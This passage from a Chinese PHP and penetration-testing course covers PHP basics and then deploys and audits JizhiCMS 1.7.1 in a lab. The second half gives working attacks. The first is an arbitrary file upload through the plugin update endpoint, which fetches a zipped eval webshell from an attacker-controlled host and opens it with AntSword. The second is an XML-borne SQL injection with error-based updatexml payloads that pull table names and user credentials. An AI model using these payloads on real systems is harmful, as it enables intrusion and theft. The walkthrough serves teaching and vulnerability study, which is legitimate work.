![image-20240909170504445](https://image.201068.xyz/assets/31.PHP/image-20240909170504445.png)

#### 3）empty()函数

判断变量是否为**空**。当变量不存在或者它的值等于`false`，那么视为空，返回值是`true`。如果存在且有值，值不为0和空时，返回false。

```
empty() 本质上与 !isset($var) || $var == false 等价。
```

示例：

```php
<?php

$var = 0;
echo "empty($var) =".empty($var) . PHP_EOL;
echo "isset($var) =".isset($var) . PHP_EOL;

// 因为 $var 为空，所以计算结果为 true
if (empty($var)) {
    echo '$var is either 0, empty, or not set at all' . PHP_EOL;
}

// 因为 $var 已赋值，所以计算结果为 true
if (isset($var)) {
    echo '$var is set even though it is empty'. PHP_EOL;
}
?>
```

一个简单的`empty()`与`isset()`的比较。

![image-20240909171640364](https://image.201068.xyz/assets/31.PHP/image-20240909171640364.png)

#### 4）$_POST

PHP预定义变量，当HTTP的请求方式是`POST`时，`$_POST`会接收 `form-data` 的数据。

##### 示例

```php
<?php

if (!empty($_POST['name'])) {

    echo "Name: " . $_POST['name'] . "<br>";
}

?>
```

> 注意：
>
> 这种POST接收参数的方式，只允许通过请求头Conten-Type为`multipart/form-data`或者`application/x-www-form-urlencoded`方式。
>
> 
>
> 如果想要接收json数据，有两种方式：
>
> 1. `$post = $GLOBALS['HTTP_RAW_POST_DATA'];`
> 2. `$post = file_get_contents("php://input");`
>
> 以上两种接收的json数据需要通过`json_decode()`函数进行解码。

##### 使用POST方式访问

http://www.wasjpentest008.com/study/post.php

![image-20240909170815677](https://image.201068.xyz/assets/31.PHP/image-20240909170815677.png)

![image-20240909171132603](https://image.201068.xyz/assets/31.PHP/image-20240909171132603.png)

#### class类

```php
<?php

class Pentest{
    public $name="";
    public $age = 0;
    public function test($a,$b)

    {
      $this->name = $a;
      $this->age = $b;
    }

    public function self()
    {
        echo $this->name . "\n";
        echo $this->age;
    }
}

$p = new Pentest();
$p->test("keyvin",18);
$p->self();
```



### 3.用户消息文件user_message.php

#### 1）foreach遍历

foreach遍历的原理：本质是数组的内部有一个指针，默认是指向数组元素的第一个元素，foreach就是

利用指针去获取数据，同时移动指针。

##### 语法结构

```php
foreach($arr as $k => $v){
	//循环体
}
```

- foreach会重置指针：让指针指向第一个元素；
- 进入foreach循环：通过指针取得当前第一个元素，然后将下标取出放到对应的下标变量`$k`中（如果存在），将值取出来放到对应的值变量$v中；（指针下移）
- 进入到循环内部（循环体），开始执行；
- 重复2和3，直到在2的时候遇到指针取不到内容（指针指向数组最后）。

##### 示例

```php
<?php
$li = ["a", "b", "c", "d", "e", "f"];
foreach ($li as $value) {
    echo $value . PHP_EOL;
}
```

![image-20240909171857294](https://image.201068.xyz/assets/31.PHP/image-20240909171857294.png)

```PHP
<?php

$arr = ['a','b','c','d','e','f'];
foreach ($arr as $value) {
    echo $value . PHP_EOL;
}

$arr = ["name" => "kevin", 'age' => 20, 'add' => "beijing", 'sex' => 'man'];
foreach ($arr as $key => $value) {
    echo $key . PHP_EOL;
    echo $value . PHP_EOL;
}
```

![image-20240909172343100](https://image.201068.xyz/assets/31.PHP/image-20240909172343100.png)



#### 2）switch语句

switch分支：有一组情形存在，通过一个条件，通常有多个值，但是**每一个值都会有对应不同的代码**要执行。

switch判断方式是将条件放到分支结构内部判断。

##### 语法结构

```php
<?php
switch(条件表达式){

    //所有条件判断： 逐个进行

    case 值1: //当前条件表达式的结果与值1相等（==）if和switch的选择：
        if能做所有的分支结构事情；
        switch处理的是条件比较多，同时比较单一，而且是固定值匹配的分支结构；
        要执行的代码段;
        break;
    /* 在switch中， 如果条件匹配成功， 那么系统就不会再次匹配条件，
    * 会自动顺序执行向下的所有代码（case代码除外） ，
    * 需要中断执行： break表示中断switch（结束） 。
    */

    case 值2:
        要执行的代码段;
        break;
        //可以使用类似else的语法： 都不匹配
    default:
        //匹配失败的代码;
        break;
}
?>
```

##### 示例

```php
<?php

//switch语句
//根据星期不同做不同的事情

$day = 7;

switch ($day) {
    case 1:
        echo '今天是星期一'.PHP_EOL;
        break;
    case 2:
        echo '今天是星期二'.PHP_EOL;
        break;
    case 3:
        echo '今天是星期三'.PHP_EOL;
        break;
    case 4:
        echo '今天是星期四'.PHP_EOL;
        break;
    case 5:
        echo '今天是星期五'.PHP_EOL;
        break;
    case 6:
        echo '今天是星期六'.PHP_EOL;
        break;
    case 7:
        echo '今天是星期日'.PHP_EOL;
        break;
    default:
        echo $day.PHP_EOL;
        break;
}
```

![image-20240909172812130](https://image.201068.xyz/assets/31.PHP/image-20240909172812130.png)

##### 计算器

```php
<?php
echo "---------------简单计算器---------------" . PHP_EOL;
// 计算器函数
function calculator($num1, $num2, $operator) {
    switch($operator) {
        case '+':
            return $num1 + $num2;
        case '-':
            return $num1 - $num2;
        case '*':
            return $num1 * $num2;
        case '/':
            if ($num2 != 0) {
                return $num1 / $num2;
            } else {
                return "除数不能为零！";
            }
        default:
            return "无效的运算符！";
    }
}

while (true) {
    // 提示用户输入
    echo "请输入第一个数字: ";
    $num1 = (float)trim(fgets(STDIN));

    echo "请输入运算符 (+, -, *, /): ";
    $operator = trim(fgets(STDIN));

    echo "请输入第二个数字: ";
    $num2 = (float)trim(fgets(STDIN));



    // 调用计算器并显示结果
    $result = calculator($num1, $num2, $operator);
    echo "结果：$num1 $operator $num2  = $result\n";

    // 询问用户是否继续
    echo "是否继续使用？(按 'q' 退出, 其他任意键继续): ";
    $choice = trim(fgets(STDIN));

    if (strtolower($choice) === 'q') {
        echo "退出程序。\n";
        break;
    }
}
?>
```



### 4.实践-写一个用户列表页面

```php
<?php

include "../db.php";

$stmt = $conn->prepare("SELECT * FROM users");

$stmt->execute();

$users = $stmt->fetchAll(PDO::FETCH_ASSOC);

?>

<!DOCTYPE html>

<html lang="zh-CN">

<head>

    <title>用户列表</title>

</head>

<body>

<div>

    <table border="2">

        <tr>

            <td>id</td>

            <td>username</td>

            <td>email</td>

            <td>password</td>

            <td>usertype</td>

        </tr>

        <?php

        if ($users) {

            foreach ($users as $user) {

                echo "<tr>";

                echo "<td>" . $user['id'] . "</td>";

                echo "<td>" . $user['username'] . "</td>";

                echo "<td>" . $user['email'] . "</td>";

                echo "<td>" . $user['password'] . "</td>";

                echo "<td>" . $user['user_type'] . "</td>";

                echo "</tr>";

            }

        }

        ?>

    </table>
</div>
</body>
</html>
```



```php
<?php
include '../db.php';
$p = $conn->query('SELECT * FROM users');
$flag = $p->execute();
$users = "";
if ($flag){
    $users = $p->fetchAll(PDO::FETCH_ASSOC);
}else{
    echo '查询失败';
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>用户列表</title>
</head>
<body>
<div>
<table border="2" align="center">
    <tr align="center">
        <td>id</td>
        <td>用户名</td>
        <td>邮箱</td>
        <td>密码</td>
        <td>用户类型</td>
    </tr>
    <tr align="center">
        <?php
            //var_dump($users);
            foreach($users as $user){
            echo "<tr>";
            echo '<td>'.$user["id"].'</td>';
            echo '<td>'.$user["username"].'</td>';
            echo '<td>'.$user["email"].'</td>';
            echo '<td>'.$user["password"].'</td>';
            echo '<td>'.$user["user_type"].'</td>';
            echo "</tr>";
        }
        ?>
    </tr>
</body>
</html>

<!--foreach ($users as $user) {-->
<!--    var_dump($user);-->
<!--    echo '<br />';-->
<!--    echo '<br />';-->
<!--    echo '<br />';-->
<!--    echo '<tr>';-->
<!--    foreach ($user as $key => $value) {-->
<!--        echo '<td>'.$value.'</td>';-->
<!--    }-->
<!--    echo '</tr>';-->
<!--}-->
```

![image-20240910102206641](https://image.201068.xyz/assets/31.PHP/image-20240910102206641-1725935009321-1.png)

## 第五节 部署与审计CMS

本节内容我们要学会如何在生产环境部署PHP项目，根据当前PHP项目分析其中包含的漏洞，以及如何利用这些漏洞。

### 1.上传

在《PHP配套教学工具》中找到 `jizhicms.zip` 这个PHP项目源码包，上传到Linux服务器的 `/var/www/html` 目录下：

```bash
scp jizhicms-1.7.1.zip root@192.168.70.15:/var/www/html/
```

![image-20240910103352507](https://image.201068.xyz/assets/31.PHP/image-20240910103352507.png)

### 2.设置运行环境

将Linux服务器的PHP解释器版本切换为`PHP 7.4`

```bash
service php82-fpm stop
vi /etc/profile

export PHP_HOME=/data/php74
#export PHP_HOME=/data/php82


source /etc/profile
php -v
service php74-fpm start
```

![image-20240910103446622](https://image.201068.xyz/assets/31.PHP/image-20240910103446622.png)

### 3.解压源码包

```bash
cd /var/www/html
unzip jizhicms-1.7.1.zip -d jizhicms
rm -f jizhicms-1.7.1.zip;
cd /var/www/html/jizhicms/jizhicms-1.7.1;mv * ../;cd ..;rm -rf jizhicms-1.7.1

cd /var/www/html/jizhicms
rm -f cache
mkdir -p cache/data
chmod -R 777 /var/www/html/jizhicms/cache/data
cd /var/www/html;chown -R apache. jizhicms
```

![image-20240910103655436](https://image.201068.xyz/assets/31.PHP/image-20240910103655436.png)

![image-20240910105045413](https://image.201068.xyz/assets/31.PHP/image-20240910105045413.png)

### 4.配置Apache

修改Apache的网站根目录

```bash
vim /etc/httpd/conf/httpd.conf

#DocumentRoot "/var/www/html"
DocumentRoot "/var/www/html/jizhicms"

#<Directory "/var/www/html">
<Directory "/var/www/html/jizhicms">

#LoadModule php_module /usr/lib64/httpd/modules/libphp.so
LoadModule php7_module /usr/lib64/httpd/modules/libphp7.so

systemctl restart httpd
```

![image-20240910103901236](https://image.201068.xyz/assets/31.PHP/image-20240910103901236.png)

![image-20240910104014776](https://image.201068.xyz/assets/31.PHP/image-20240910104014776.png)

### 5.访问

访问当前服务器的IP或者Apache绑定的域名

http://192.168.70.15/install/index.php

![image-20240910104812163](https://image.201068.xyz/assets/31.PHP/image-20240910104812163.png)

![image-20240910105011363](https://image.201068.xyz/assets/31.PHP/image-20240910105011363.png)

![image-20240910105336582](https://image.201068.xyz/assets/31.PHP/image-20240910105336582.png)

![image-20240910105406222](https://image.201068.xyz/assets/31.PHP/image-20240910105406222.png)

![image-20240910105900898](https://image.201068.xyz/assets/31.PHP/image-20240910105900898.png)

![image-20240910105505763](https://image.201068.xyz/assets/31.PHP/image-20240910105505763.png)

#### 后台

http://192.168.70.15/admin.php

![image-20240910111609366](https://image.201068.xyz/assets/31.PHP/image-20240910111609366.png)

#### 前台

http://192.168.70.15/

![image-20240910111635669](https://image.201068.xyz/assets/31.PHP/image-20240910111635669.png)

### 6.审计源代码

#### 1）导入源码

在《PHP配套教学工具》中打开Seay源代码审计工具，点击 新建项目 将 jizhicms 导入审计系统中；

![image-20240910142250532](https://image.201068.xyz/assets/31.PHP/image-20240910142250532.png)

#### 2）开始审计

点击主菜单的 自动审计 ，然后点击 开始 即可开始对PHP项目进行源代码审计；

![image-20240910142316174](https://image.201068.xyz/assets/31.PHP/image-20240910142316174.png)

#### 3）审计完成

完成后，可以点击 **生成报告** ，生成一个html文档，如下图所示，包好所有审计出来的漏洞；

![image-20240910142120113](https://image.201068.xyz/assets/31.PHP/image-20240910142120113.png)

![image-20240910142144116](https://image.201068.xyz/assets/31.PHP/image-20240910142144116.png)

### 7.漏洞分析

#### 1）任意文件上传漏洞

##### 分析PluginsController.php

查看ID为27的这个漏洞，漏洞描述为：**文件操作函数中存在变量，可能存在任意文件读取/删除/修改/写入等漏洞**。

我们找到这个漏洞存在的方法位置：`jizhicms/A/c/PluginsController.php`

![image-20240910151002408](https://image.201068.xyz/assets/31.PHP/image-20240910151002408.png)

```php
fwrite($download_fp, fread($fp, 1024 * 8 ), 1024 * 8);
```

![image-20240910151308051](https://image.201068.xyz/assets/31.PHP/image-20240910151308051.png)

![image-20240911090933092](https://image.201068.xyz/assets/31.PHP/image-20240911090933092.png)

```php
//更新插件
	function update(){
		$filepath = $this->frparam('filepath',1);
		if($filepath){
			if($this->frparam('action',1)){
				$action = $this->frparam('action',1);
				// 自己获取这些信息
				$remote_url  = urldecode($this->frparam('download_url',1));
				$file_size   = $this->frparam('filesize',1);
				$tmp_path    = Cache_Path."/update_".$filepath.".zip";//临时下载文件路径
				switch ($action) {
				    case 'prepare-download':
				    	$code = 0;
						ob_start(); 
						$ch=curl_init($remote_url); 
						curl_setopt($ch,CURLOPT_HEADER,1); 
						curl_setopt($ch,CURLOPT_NOBODY,1); 
						$okay=curl_exec($ch); 
						curl_close($ch); 
						$head=ob_get_contents(); 
						ob_end_clean(); 
						$regex='/Content-Length:\s([0-9].+?)\s/'; 
						$count=preg_match($regex,$head,$matches); 
						$filesize = isset($matches[1])&&is_numeric($matches[1])?$matches[1]:0; 

				        JsonReturn(array('code'=>0,'size'=>$filesize));
				        break;
				    case 'start-download':
				        // 这里检测下 tmp_path 是否存在
				        try {
				            set_time_limit(0);
				            touch($tmp_path);
				            // 做些日志处理
				            if ($fp = fopen($remote_url, "rb")) {
				                if (!$download_fp = fopen($tmp_path, "wb")) {
				                    exit;
				                }
				                while (!feof($fp)) {
				                    if (!file_exists($tmp_path)) {
				                        // 如果临时文件被删除就取消下载
				                        fclose($download_fp);
				                        exit;
				                    }
				                    fwrite($download_fp, fread($fp, 1024 * 8 ), 1024 * 8);
				                }
				                fclose($download_fp);
				                fclose($fp);
				            } else {
				                exit;
				            }
				        } catch (Exception $e) {
				            Storage::remove($tmp_path);
				            JsonReturn(['code'=>1,'msg'=>'发生错误：'.$e->getMessage()]);
				        }

				        JsonReturn(['code'=>0,'tmp_path'=>$tmp_path]);
				        break;
				    case 'get-file-size':
				        // 这里检测下 tmp_path 是否存在
				        if (file_exists($tmp_path)) {
				            
				            JsonReturn(['code'=>0,'size'=>filesize($tmp_path)]);
				        }
				        break;
				    case 'file-upzip':

				    	if (!file_exists($tmp_path)) {//先判断待解压的文件是否存在
						   JsonReturn(['code'=>1,'msg'=>'下载缓存文件不存在！']);
						}
						$path = APP_PATH.'A/exts/';
						$zip = new \ZipArchive;
						//$tmp_path = str_replace('/','\\',$tmp_path);
						$res = $zip->open($tmp_path);
						if ($res === TRUE) {
							
							//解压缩到test文件夹
							$zip->extractTo(APP_PATH.'A/exts');
							$zip->close();
						} else {
							
							JsonReturn(['code'=>1,'msg'=>'解压失败：failed, code:' . $res]);
						}
					
						if($filepath=='jizhicmsupdate'){
							$isinstall = true;
						}else{
							if(M('plugins')->find(['filepath'=>$filepath])){
								$isinstall = true;
							}else{
								$isinstall = false;
							}
						}
						
						JsonReturn(['code'=>0,'msg'=>'解压完成！','isinstall'=>$isinstall]);
				    	break;
				    case 'plugin-install':
				    	$dir = APP_PATH.'A/exts';
				    	require_once($dir.'/'.$filepath.'/PluginsController.php');
						$plg = new \A\exts\PluginsController($this->frparam());
						
						
						$step1 = $plg->install();//执行安装
						if(!$step1){
							JsonReturn(array('code'=>1,'msg'=>'执行插件安装程序失败！'));
						}

						$config = require_once($dir.'/'.$filepath.'/config.php');
						
						$plg_old = M('plugins')->find(['filepath'=>$filepath]);
						if($plg_old){
							//保存原配置
							$w = ['name'=>$config['name'],'filepath'=>$filepath,'description'=>$config['desc'],'version'=>$config['version'],'author'=>$config['author'],'update_time'=>strtotime($config['update_time']),'module'=>$config['module'],'isopen'=>0,'config'=>$plg_old['config'],'addtime'=>time()];
						}else{
							$w = ['name'=>$config['name'],'filepath'=>$filepath,'description'=>$config['desc'],'version'=>$config['version'],'author'=>$config['author'],'update_time'=>strtotime($config['update_time']),'module'=>$config['module'],'isopen'=>0,'config'=>'','addtime'=>time()];
						}
						//复制文件到对应文件夹
						//移动前台插件控制器
						$sourcefile = $dir.'/'.$filepath.'/controller/home';
						$target = APP_PATH.'Home/plugins';
						if(is_dir($sourcefile) && is_dir($target)){
							if (false != ($handle = opendir ( $sourcefile ))) {
							
								while ( false !== ($file = readdir ( $handle )) ) {
									//去掉"“.”、“..”以及带“.xxx”后缀的文件
									if ($file != "." && $file != "..") {
										$fs = $sourcefile.'/'.$file;
										$ft = $target.'/'.$file;
										$r = $this->file2dir($fs,$ft);
										if(!$r){
											JsonReturn(array('code'=>1,'msg'=>'插件安装失败！sourcefile:'.$fs.' targetfile:'.$ft));
										}
									}
								}
								//关闭句柄
								closedir ( $handle );
							}
							
						}
						
						//移动后台插件控制器
						$sourcefile = $dir.'/'.$filepath.'/controller/admin';
						$target = APP_PATH.'A/plugins';
						if(is_dir($sourcefile) && is_dir($target)){
							if (false != ($handle = opendir ( $sourcefile ))) {
								
								while ( false !== ($file = readdir ( $handle )) ) {
									//去掉"“.”、“..”以及带“.xxx”后缀的文件
									if ($file != "." && $file != "..") {
										$fs = $sourcefile.'/'.$file;
										$ft = $target.'/'.$file;
										$r = $this->file2dir($fs,$ft);
										if(!$r){
											JsonReturn(array('code'=>1,'msg'=>'插件安装失败！sourcefile:'.$fs.' targetfile:'.$ft));
										}
									}
								}
								//关闭句柄
								closedir ( $handle );
							}
						
						}
						
						
						//移动扩展类文件
						$src = $dir.'/'.$filepath.'/class';
						$dst = APP_PATH.'FrPHP/Extend';
						if(is_dir($src)){
							$this->recurse_copy($src,$dst);
						}
						
						
						$res = M('plugins')->update(['filepath'=>$filepath],$w);
						
						setCache('hook',null);
						
						
						JsonReturn(array('code'=>0,'msg'=>'安装成功！'));
				    	break;
				    default:
				        # code...
				        break;
				}
			}
			$config = require_once(APP_PATH.'A/exts/'.$filepath.'/config.php');
			$r = file_get_contents('http://api.jizhicms.cn/plugins.php?name='.$filepath.'&v='.$config['version']);
			$rr = json_decode($r,1);
			if($rr['code']==0){
				$this->plugin = $config;
				$this->data = $rr['data'];
				//获取远程文件大小
				$downurl = $rr['data']['url'];
				ob_start(); 
				$ch=curl_init($downurl); 
				curl_setopt($ch,CURLOPT_HEADER,1); 
				curl_setopt($ch,CURLOPT_NOBODY,1); 
				$okay=curl_exec($ch); 
				curl_close($ch); 
				$head=ob_get_contents(); 
				ob_end_clean(); 
				$regex='/Content-Length:\s([0-9].+?)\s/'; 
				$count=preg_match($regex,$head,$matches); 
				$filesize = isset($matches[1])&&is_numeric($matches[1])?$matches[1]:0; 
				$this->filesize = $filesize;
				$this->filepath = $filepath;
				$this->display('plugins-update');exit;
			}else{
				//JsonReturn(array('code'=>1,'msg'=>'该插件暂无更新！'));
				exit('该插件暂无更新！');
			}

			
		}
		JsonReturn(array('code'=>1,'msg'=>'参数错误,必须携带插件ID！'));
	}
```

我们可以看到这是插件更新的方法，这个方法内部逻辑的**大体流程**是：

- 从URL接收`download_url`这个参数，它的值是一个zip文件下载链接；
- 从这个链接下载zip包，然后保存在 `jizhicms/A/exts` 目录中；
- 将保存的zip包同时解压在 `jizhicms/A/exts` 目录中；



从方法体开始看，它并没有对传入的 `download_url` 的值进行判断和限制，那么，我们只需要在自己控制的网站上压缩可执行脚本，然后将URL赋值给 `download_url` 即可实现任意文件的上传。

传进来的值通过`frparam`函数处理之后便赋值给了`remote_url`。

跟进`frparam()`方法中，该函数为位于 `jizhicms/FrPHP/lib/Controller.php` 中。该函数并没有对传入的值进行过滤，只是简单的判断是什么类型的请求方式，然后从payload里取出download_url 的值。

继续回到`update()`方法，在获取到了`remote_url`的值后，便进行了下载以及解压缩的操作。

最后解压的目录为 `/A/exts` 。

当前update()方法的请求URL是：

```bash
http://192.168.70.15/admin.php/Plugins/update.html
```

我们使用`Burpsuite`工具进行访问截断，查看它payload是什么样的。

##### burp抓包

登录CMS后台，在扩展管理标签下，点击插件列表，随便点击一个插件下载

![image-20240910152624449](https://image.201068.xyz/assets/31.PHP/image-20240910152624449.png)

在`Burpsuite`中开启代理截断，查看Burpsuite截取的数据包：

###### start-download

![image-20240910152743961](https://image.201068.xyz/assets/31.PHP/image-20240910152743961.png)

```bash
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.70.15
Content-Length: 98
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.70.15
Referer: http://192.168.70.15/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8tekc35vp8q9bkv9j3603ece4p
Connection: keep-alive

action=start-download&filepath=apidata&download_url=http%3A%2F%2Fdown.jizhicms.cn%2Fapidata2.1.zip
```

它的payload

```bash
action=start-download&filepath=apidata&download_url=http://down.jizhicms.cn/apidata2.1.zip
```

![image-20240910153027433](https://image.201068.xyz/assets/31.PHP/image-20240910153027433.png)

```
/admin.php/Plugins/[object Object]
```

![image-20240910153128245](https://image.201068.xyz/assets/31.PHP/image-20240910153128245.png)

##### get-file-size

```bash
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.70.15
Content-Length: 97
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.70.15
Referer: http://192.168.70.15/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8tekc35vp8q9bkv9j3603ece4p
Connection: keep-alive

action=get-file-size&filepath=apidata&download_url=http://down.jizhicms.cn/apidata2.1.zip
```



![image-20240910153406568](https://image.201068.xyz/assets/31.PHP/image-20240910153406568.png)

```
/admin.php/Index/update_session_maxlifetime.html
```

##### payload

###### a.php

我们在其他网站上创建一个`a.php`，并写入一句话木马：

```php
<?php
	@eval($_POST["mima"]);
?>
```

![image-20240910155711100](https://image.201068.xyz/assets/31.PHP/image-20240910155711100.png)

###### 将a.php打包为a.zip：

```bash
zip a.zip a.php
```

![image-20240910160030063](https://image.201068.xyz/assets/31.PHP/image-20240910160030063.png)

http://192.168.70.1/a.zip

![image-20240910161814844](https://image.201068.xyz/assets/31.PHP/image-20240910161814844.png)

![image-20240910161705248](https://image.201068.xyz/assets/31.PHP/image-20240910161705248.png)

###### 构造payload

然后只需要将download_url的值修改为自己网站上压缩可执行脚本的下载路径，action参数不可以修改，构造成如下payload：

```bash
action=start-download&filepath=a&download_url=http://192.168.70.1/a.zip
```

##### burpsuite发送请求

###### 上传

> start-download

```bash
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.70.15
Content-Length: 98
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.70.15
Referer: http://192.168.70.15/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8tekc35vp8q9bkv9j3603ece4p
Connection: keep-alive

action=start-download&filepath=a&download_url=http%3A%2F%2F192.168.70.1%2Fa.zip
```

![image-20240910162839693](https://image.201068.xyz/assets/31.PHP/image-20240910162839693.png)

###### 解压

> file-upzip

```bash
POST /admin.php/Plugins/update.html HTTP/1.1
Host: 192.168.70.15
Content-Length: 98
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.70.15
Referer: http://192.168.70.15/admin.php/Plugins/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fod956krqfv3f9if8f151u71ld
Connection: keep-alive

action=file-upzip&filepath=a&download_url=http%3A%2F%2F192.168.70.1%2Fa.zip
```

![image-20240911092112265](https://image.201068.xyz/assets/31.PHP/image-20240911092112265.png)

##### postman发送请求：

###### 上传

```bash
http://192.168.70.15/admin.php/Plugins/update.html
action=start-download
filepath=webshell
download_url=http://192.168.70.1/a.zip

Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: PHPSESSID=8tekc35vp8q9bkv9j3603ece4p
```

![image-20240910155152887](https://image.201068.xyz/assets/31.PHP/image-20240910155152887.png)

> 注意：
>
> 将Headers的`Content-Type`参数的值修改为： `application/x-www-form-urlencoded;charset=UTF-8`

![image-20240910162057390](https://image.201068.xyz/assets/31.PHP/image-20240910162057390.png)

![image-20240910162129934](https://image.201068.xyz/assets/31.PHP/image-20240910162129934.png)

```
/var/www/html/jizhicms/cache/update_webshell.zip
```

![image-20240910162420031](https://image.201068.xyz/assets/31.PHP/image-20240910162420031.png)

###### 解压

```bash
http://192.168.70.15/admin.php/Plugins/update.html
action=file-upzip
filepath=webshell
download_url=http://192.168.70.1/a.zip

Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: PHPSESSID=fod956krqfv3f9if8f151u71ld
```

![image-20240911093134107](https://image.201068.xyz/assets/31.PHP/image-20240911093134107.png)

##### 访问

http://192.168.70.15/A/exts/a.php

我们到网站的 `A/exts` 目录下查看,可以看到 `a.php` 被成功的解压出来。

即使后台没有登录的情况下，也可以成功访问这个URL。

![image-20240911092217286](https://image.201068.xyz/assets/31.PHP/image-20240911092217286.png)

##### 蚁剑

```bash
http://192.168.70.15/A/exts/a.php
mima
```

![image-20240911092449949](https://image.201068.xyz/assets/31.PHP/image-20240911092449949.png)

![image-20240911092506987](https://image.201068.xyz/assets/31.PHP/image-20240911092506987.png)

#### 2）SQL注入漏洞

##### 分析

查看ID是125这个漏洞，漏洞描述为：“**读取文件函数中存在变量，可能存在任意文件读取漏洞**”。

我们找到这个漏洞存在的方法位置：`jizhicms/Home/c/WechatController.php`

![image-20240910164217369](https://image.201068.xyz/assets/31.PHP/image-20240910164217369.png)

```
$json = file_get_contents($url);
```

![image-20240910164543136](https://image.201068.xyz/assets/31.PHP/image-20240910164543136.png)

这个漏洞虽然提示的是任意文件读取漏洞，但是经过测试URL，发现存在SQL注入漏洞，下面我们对`responseMsg`方法进行分析。

![image-20240910194554870](https://image.201068.xyz/assets/31.PHP/image-20240910194554870.png)

这个方法的逻辑是，通过POST请求传入xml数据，为什么是xml数据？

因为199行使用了将字符串转换为xml对象的 `simplexml_load_string` 函数，得到xml对象后，赋值给` $postObj `变量。

但是我们不知道在xml对象里都包含哪些标签，我们要对方法体内部所有使用$postObj对象的key进行收集和分析，以确保代码运行到227行：

```
$islive = M('member')->find(array('openid'=>$openid));
```

这一行代码就存在SQL注入点，随意传入一个字符串，就可以触发漏洞。

下面我们收集POST请求的xml参数所需要的key。

![image-20240910164733468](https://image.201068.xyz/assets/31.PHP/image-20240910164733468-1725958076799-1.png)

- 201行`$postObj->FromUserName;`
- 202行`$postObj->ToUserName;`
- 213行`$postObj->MsgType;`
- 214行`$postObj->Event;`

到227行之前，所有的key都收集完成，只要从开始到227行代码执行了，那么SQL语句就注入成功。

![image-20240910170456388](https://image.201068.xyz/assets/31.PHP/image-20240910170456388-1725959112695-3.png)

##### 构造pyload

下面构造POST请求参数：

```xml
<?xml version='1.0' ?>
<ducument>
<MsgType>
event
</MsgType>
<Event>
subscribe
</Event>
<FromUserName>
kevin'
</FromUserName>
</ducument>
```

![image-20240910194219704](https://image.201068.xyz/assets/31.PHP/image-20240910194219704.png)

##### 测试

使用`hackbar`测试当前方法的URL：http://jizhicms/wechat/responseMsg

```xml
http://jizhicms/wechat/responseMsg

<?xml version='1.0' ?>
<document>
<FromUserName>
abcd'
</FromUserName>
<ToUserName>

</ToUserName>
<Content>

</Content>
<MsgType>
event
</MsgType>
<Event>
subscribe
</Event>
</document>
```

![image-20240910194307712](https://image.201068.xyz/assets/31.PHP/image-20240910194307712.png)

可以给 `FromUserName` 标签传入不同的SQL语句字符串，来进行SQL注入测试。

##### SQL注入

###### 字段数

```
abcd' order by 1  #
```

![image-20240910195515805](https://image.201068.xyz/assets/31.PHP/image-20240910195515805.png)

```sql
INSERT INTO jz_member (openid,regtime) VALUES ('abcd' order by 1 #','1725969275')
```

###### 显示位

```sql
abcd' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30 #
abcd' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31 #
```

![image-20240910195953742](https://image.201068.xyz/assets/31.PHP/image-20240910195953742.png)

![image-20240910195851903](https://image.201068.xyz/assets/31.PHP/image-20240910195851903.png)

**无回显点**

###### 报错注入

```sql
abcd' and updatexml(1,concat(0x7e,database(),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)#
```



###### 数据库名称

```
abcd' and updatexml(1,concat(0x7e,database(),0x7e),1)#
```

![image-20240910200519690](https://image.201068.xyz/assets/31.PHP/image-20240910200519690.png)

> jizhicms

###### 表名

```sql
abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),32,31),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),63,31),0x7e),1)#

abcd' or updatexml(1,concat(0x7e,substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),94,31),0x7e),1)#

